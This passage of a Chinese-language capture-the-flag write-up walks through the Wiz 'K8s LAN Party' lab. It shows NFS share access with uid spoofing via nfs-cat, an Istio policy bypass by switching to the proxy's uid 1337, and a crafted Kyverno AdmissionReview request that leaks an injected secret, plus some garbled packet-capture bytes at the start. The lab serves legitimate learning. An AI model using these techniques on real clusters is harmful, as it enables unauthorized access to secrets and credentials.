class="line"><span class="string">¡îù\\Iïýe¾À</span></span><br><span class="line"><span class="string">BB&gt;òVA4#&#x27;</span>|&#125;E46z@EëÀ×</span><br><span class="line">d«&#123;²¢P+SP­Ìö</span><br><span class="line"></span><br><span class="line">\\I¡îùïýeìÀ</span><br><span class="line">&gt;òVA4<span class="comment">#&#x27;|&#125;E</span></span><br><span class="line">6&#123;@EÀ×</span><br><span class="line">d«&#123;²¢P+SP­Ìö[</span><br><span class="line">\\I¡îùPOST / HTTP/1.1</span><br><span class="line">Host: reporting-service</span><br><span class="line">User-Agent: curl/7.64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 63</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;ïýeÂ</span><br><span class="line">BB<span class="string">&#x27;|&#125;ª&gt;òVA4E4á@â</span></span><br><span class="line"><span class="string">d«&#123;À×P²¢»­Ì+SQtü</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">¡îú\\IïýeëÊ</span></span><br><span class="line"><span class="string">&#x27;</span>|&#125;ª&gt;òVA4Eá@</span><br><span class="line">d«&#123;À×P²¢»­Ì+SQtüR</span><br><span class="line">¡îü\\IHTTP/1.1 200 OK</span><br><span class="line">server: istio-envoy</span><br><span class="line"><span class="built_in">date</span>: Fri, 22 Mar 2024 05:11:11 GMT</span><br><span class="line">content-type: text/plain</span><br><span class="line">x-envoy-upstream-service-time: 1</span><br><span class="line">x-envoy-decorator-operation: :0/*</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p><code>wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;</code></p>
+<h2 id="Challenge-3：DATA-LEAKAGE"><a href="#Challenge-3：DATA-LEAKAGE" class="headerlink" title="Challenge 3：DATA LEAKAGE"></a>Challenge 3：DATA LEAKAGE</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><strong>Exposed File Share</strong></p>
+<blockquote>
+<p>The targeted big corp utilizes outdated, yet  cloud-supported technology for data storage in production. But oh my,  this technology was introduced in an era when access control was only network-based 🤦‍️.</p>
+</blockquote>
+<p><strong>Hint</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你可能会发现查看 nfs-cat 和 nfs-ls 的文档很有用。</span><br></pre></td></tr></table></figure>
+
+<h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><ul>
+<li>Network File System（NFS）</li>
+<li>mount</li>
+<li>nfs-cat、nfs-ls</li>
+</ul>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ol>
+<li><h4 id="nfs-cat-和-nfs-ls"><a href="#nfs-cat-和-nfs-ls" class="headerlink" title="nfs-cat 和 nfs-ls"></a><code>nfs-cat</code> 和 <code>nfs-ls</code></h4><p>关注描述里的：”this technology was introduced in an era when access control was only network-based”，和提示给的 <code>nfs-cat</code> 和 <code>nfs-ls</code></p>
+</li>
+<li><h4 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h4></li>
+</ol>
+<p>NFS，是 Network File System 的简写，即网络文件系统。网络文件系统是FreeBSD支持的文件系统中的一种，也被称为NFS. NFS允许一个系统在网络上与他人共享目录和文件。 通过使用NFS，用户和程序可以像访问本地文件一样访问远端系统上的文件。</p>
+<p>就是一个数据存储服务器或者服务，跟主机之间通过 nfs 来通信，主要是挂载。</p>
+<ol start="3">
+<li><h4 id="查看-mount"><a href="#查看-mount" class="headerlink" title="查看 mount"></a>查看 mount</h4></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:/var/run/secrets$ mount | grep nfs    </span><br><span class="line">fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs <span class="built_in">type</span> nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.4.189,local_lock=none,addr=192.168.124.98)</span><br></pre></td></tr></table></figure>
+
+<p>发现好东西，这不得看看怎么个事儿。</p>
+<blockquote>
+<p>GPT 解释：</p>
+<ul>
+<li><code>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com</code>: 这是一个 NFS 文件系统的远程服务器地址。NFS（Network File System）是一种网络文件系统协议，允许远程计算机通过网络共享文件。</li>
+<li><code>:/</code>: 这表示将远程文件系统的根目录挂载到本地目录。冒号之前是远程服务器的地址和共享的路径，冒号之后是挂载点。</li>
+<li><code>/efs</code>: 这是本地文件系统的挂载点。在本例中，远程 NFS 文件系统的根目录将会被挂载到本地的 <code>/efs</code> 目录。</li>
+</ul>
+</blockquote>
+<ol start="4">
+<li><h4 id="发现-flag"><a href="#发现-flag" class="headerlink" title="发现 flag"></a>发现 flag</h4></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:/var/run/secrets$ <span class="built_in">cd</span> /efs</span><br><span class="line">player@wiz-k8s-lan-party:/efs$ <span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">player@wiz-k8s-lan-party:/efs$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>呵呵呵</p>
+<p>想到hint里的 <code>nfs-cat</code> 和 <code>nfs-ls</code></p>
+<p><code>nfs-cat</code> 和 <code>nfs-ls</code> 是 NFS (Network File System) 的一些常见工具，用于从 NFS 服务器上读取文件内容和列出目录内容。这些工具通常需要在客户端上安装并配置 NFS 客户端来使用。学学规则，执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nfs-cat <span class="string">&#x27;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>不知道是我的问题还是<code>nfs server</code> 挂了，连不上。服了</p>
+<p>好吧：格式还是好好看清楚，还要加传参</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ nfs-cat <span class="string">&#x27;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4.1&amp;uid=0&#x27;</span></span><br><span class="line">wiz_k8s_lan_party&#123;old-school-network-file-shares-infiltrated-the-cloud!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Challenge-4：BYPASSING-BOUNDARIES"><a href="#Challenge-4：BYPASSING-BOUNDARIES" class="headerlink" title="Challenge 4：BYPASSING BOUNDARIES"></a>Challenge 4：BYPASSING BOUNDARIES</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><strong>The Beauty and The Ist</strong></p>
+<blockquote>
+<p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don’t abuse this power; use it responsibly and with caution.</p>
+</blockquote>
+<p><strong>hint</strong> <code>Try examining Istio&#39;s [IPTables rules](&lt;https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables&gt;).</code></p>
+<p>题目给的 policy</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AuthorizationPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">istio-get-flag</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">k8s-lan-party</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">action:</span> <span class="string">DENY</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">&quot;&#123;flag-pod-name&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span></span><br><span class="line">        <span class="attr">namespaces:</span> [<span class="string">&quot;k8s-lan-party&quot;</span>]</span><br><span class="line">    <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">operation:</span></span><br><span class="line">        <span class="attr">methods:</span> [<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>浅浅问一波 gpt：这个 AuthorizationPolicy 定义了一个访问控制策略，拒绝具有特定标签的应用程序（”{flag-pod-name}”）的请求，同时只允许来自 k8s-lan-party 命名空间的 POST 和 GET 请求访问目标资源。</p>
+</blockquote>
+<h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><ul>
+<li>Istio</li>
+<li>IPTables</li>
+<li>PID&#x2F;UID&#x2F;GID</li>
+</ul>
+<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><ol>
+<li>打开靶场给的 <code>root</code> 很难不让我想到逃逸。哈哈。</li>
+<li>先学一下 hint 里面的 <code>lstio</code> 和<code>iptabl</code></li>
+</ol>
+<h4 id="lstio"><a href="#lstio" class="headerlink" title="lstio"></a>lstio</h4><blockquote>
+<p>它是一个完全开源的服务网格，以透明层的方式构建在现有分布式应用中。它也是一个提供了各种API的平台，可以与任何日志平台、监控系统或策略系统集成。Istio的多样化特性可以让你高效地运行分布式微服务架构，并提供一种统一的方式来保护、连接和监控微服务</p>
+</blockquote>
+<h4 id="iptabl"><a href="#iptabl" class="headerlink" title="iptabl"></a>iptabl</h4><blockquote>
+<p><code>iptables</code> 是 Linux 内核中的防火墙软件 netfilter 的管理工具，位于用户空间，同时也是 netfilter 的一部分。Netfilter 位于内核空间，不仅有网络地址转换的功能，也具备数据包内容修改、以及数据包过滤等防火墙功能。</p>
+</blockquote>
+<p>iptable 中一共有五张表，分别负责不同的方向(数据包、防火墙、网络地址转换、数据包修改、访问控制)，不同地方表具有的链路(输入输出等)也不同。</p>
+<p>以 <code>filtter</code> 表为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -L -v</span><br><span class="line">Chain INPUT (policy ACCEPT 350K packets, 63M bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br><span class="line">Chain OUTPUT (policy ACCEPT 18M packets, 1916M bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure>
+
+<p>看到三个默认的链，分别是 INPUT、FORWARD 和 OUTPUT，每个链中的第一行输出表示链名称（在本例中为 INPUT&#x2F;FORWARD&#x2F;OUTPUT），后跟默认策略（ACCEPT）。</p>
+<p>每条链中都可以添加多条规则，规则是按照顺序从前到后执行的。看下规则的表头定义。</p>
+<ul>
+<li><strong>pkts</strong>：处理过的匹配的报文数量</li>
+<li><strong>bytes</strong>：累计处理的报文大小（字节数）</li>
+<li><strong>target</strong>：如果报文与规则匹配，指定目标就会被执行。</li>
+<li><strong>prot</strong>：协议，例如 <code>tdp</code>、<code>udp</code>、<code>icmp</code> 和 <code>all</code>。</li>
+<li><strong>opt</strong>：很少使用，这一列用于显示 IP 选项。</li>
+<li><strong>in</strong>：入站网卡。</li>
+<li><strong>out</strong>：出站网卡。</li>
+<li><strong>source</strong>：流量的源 IP 地址或子网，或者是 <code>anywhere</code>。</li>
+<li><strong>destination</strong>：流量的目的地 IP 地址或子网，或者是 <code>anywhere</code>。</li>
+</ul>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><ul>
+<li>service：dnscan 扫描</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istio-protected-pod-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>
+
+<p>命名空间没问题，问题在于被拒绝了：具有特定标签 <code>&#123;flag-pod-name&#125;</code> 的应用程序（”<code>istio-protected-pod-service</code>“）的请求</p>
+<h4 id="hint-分析"><a href="#hint-分析" class="headerlink" title="hint 分析"></a>hint 分析</h4><p>关键概念：<strong>Magic constants</strong></p>
+<p>1337 - uid and gid used to distinguish between traffic originating from proxy vs the applications.</p>
+<p>重要的就是</p>
+<blockquote>
+<p><strong>Outbound bypass</strong></p>
+<ul>
+<li>If you observe the iptables rules above, you will see a magic number (1337) appear several times. <strong><code>This is the uid/gid of the running proxy which is used by iptables</code></strong> to differentiate between packets originating from the proxy and the ones originating from the application. When packets originate from the application, they must be redirected to proxy to implement a service mesh. When packets originate from the proxy, <strong><code>they \*must not\* be redirected</code></strong> as doing so will cause an infinite loop.</li>
+</ul>
+</blockquote>
+<p>This can cause multiple issues.</p>
+<p>If the cluster is not mTLS, the outbound policies could be bypassed such as <code>Data leak prevention</code></p>
+<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>查看 UID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~<span class="comment"># cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin</span><br><span class="line">istio:x:1337:1337::/home/istio:/bin/sh</span><br><span class="line">player:x:1001:1001::/home/player:/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>发现亮点：<code>istio:x:1337:1337::/home/istio:/bin/sh</code>  ，root(也就是当前用户)UID和GID为 <code>1337</code></p>
+<p>根据：<a target="_blank" rel="noopener" href="https://github.com/istio/istio/issues/4286">https://github.com/istio/istio/issues/4286</a></p>
+<p>我们直接切这个用户然后就可以绕过 <code>deny</code> 了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~<span class="comment"># su istio</span></span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1337(istio) gid=1337(istio) <span class="built_in">groups</span>=1337(istio)</span><br><span class="line">$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local</span><br><span class="line">wiz_k8s_lan_party&#123;only-leet-hex0rs-can-play-both-k8s-and-linux&#125;$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge-5：LATERAL-MOVEMENT"><a href="#challenge-5：LATERAL-MOVEMENT" class="headerlink" title="challenge 5：LATERAL MOVEMENT"></a>challenge 5：LATERAL MOVEMENT</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><h4 id="Who-will-guard-the-guardians"><a href="#Who-will-guard-the-guardians" class="headerlink" title="Who will guard the guardians?"></a><strong>Who will guard the guardians?</strong></h4><blockquote>
+<p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</p>
+</blockquote>
+<h4 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a><strong>Hint</strong></h4><blockquote>
+<p>Need a hand crafting AdmissionReview requests? Checkout  <a target="_blank" rel="noopener" href="https://github.com/anderseknert/kube-review">https://github.com/anderseknert/kube-review</a>.</p>
+</blockquote>
+<h4 id="Policy"><a href="#Policy" class="headerlink" title="Policy"></a>Policy</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">apply-flag-to-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">sensitive-ns</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">inject-env-vars</span></span><br><span class="line">      <span class="attr">match:</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Pod</span></span><br><span class="line">      <span class="attr">mutate:</span></span><br><span class="line">        <span class="attr">patchStrategicMerge:</span></span><br><span class="line">          <span class="attr">spec:</span></span><br><span class="line">            <span class="attr">containers:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="attr">env:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FLAG</span></span><br><span class="line">                    <span class="attr">value:</span> <span class="string">&quot;&#123;flag&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>Dynamic Admission Control<ul>
+<li><strong>admission webhooks</strong></li>
+<li>AdmissionReview</li>
+</ul>
+</li>
+</ul>
+<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ol>
+<li>学习题目描述和 hint</li>
+</ol>
+<p><strong><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">Webhook request and response</a></strong></p>
+<ul>
+<li>webhooks can specify what versions of <code>AdmissionReview</code> objects they accept with the <code>admissionReviewVersions</code> field in their configuration</li>
+</ul>
+<p>就是一套请求响应体系。不能直接发请求，需要加上 JSON 构造一个合法请求。</p>
+<blockquote>
+<p>When allowing a request, a mutating admission webhook may optionally modify the incoming object as well. This is done using the<code>patch</code> and<code>patchType</code> fields in the response. The only currently supported <code>patchType</code> is <code>JSONPatch</code>.For <code>patchType: JSONPatch</code>, the <code>patch</code>  field contains a base64-encoded array of JSON patch operations.</p>
+</blockquote>
+<ol>
+<li>信息搜集</li>
+</ol>
+<p><strong>Service</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kyverno-cleanup-controller.kyverno.svc.cluster.local.</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.</span><br></pre></td></tr></table></figure>
+
+<p>没懂啥意思，但是就是直接请求给的<code>policy</code> 转换的JSON，然后就返回patch了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ curl -k -X POST &lt;https://kyverno-svc.kyverno.svc.cluster.local&gt;./mutate -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;psych&quot;,&quot;uid&quot;:&quot;xxx&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;psych-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;psych-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&quot;kind&quot;:&quot;CreateOptions&quot;&#125;,&quot;dryRun&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;AdmissionReview&quot;</span>,<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;admission.k8s.io/v1&quot;</span>,<span class="string">&quot;request&quot;</span>:&#123;<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;</span>,<span class="string">&quot;kind&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>&#125;,<span class="string">&quot;resource&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;resource&quot;</span>:<span class="string">&quot;pods&quot;</span>&#125;,<span class="string">&quot;requestKind&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>&#125;,<span class="string">&quot;requestResource&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;resource&quot;</span>:<span class="string">&quot;pods&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example-pod&quot;</span>,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;sensitive-ns&quot;</span>,<span class="string">&quot;operation&quot;</span>:<span class="string">&quot;CREATE&quot;</span>,<span class="string">&quot;userInfo&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;psych&quot;</span>,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;groups&quot;</span>:[<span class="string">&quot;system:authenticated&quot;</span>]&#125;,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>,<span class="string">&quot;metadata&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;psych-pod&quot;</span>,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;sensitive-ns&quot;</span>&#125;,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;containers&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;psych-container&quot;</span>,<span class="string">&quot;image&quot;</span>:<span class="string">&quot;nginx&quot;</span>,<span class="string">&quot;env&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;FLAG&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;&#123;flag&#125;&quot;</span>&#125;]&#125;]&#125;&#125;,<span class="string">&quot;oldObject&quot;</span>:null,<span class="string">&quot;dryRun&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;options&quot;</span>:&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;meta.k8s.io/v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;CreateOptions&quot;</span>&#125;&#125;,<span class="string">&quot;response&quot;</span>:&#123;<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;</span>,<span class="string">&quot;allowed&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;patch&quot;</span>:<span 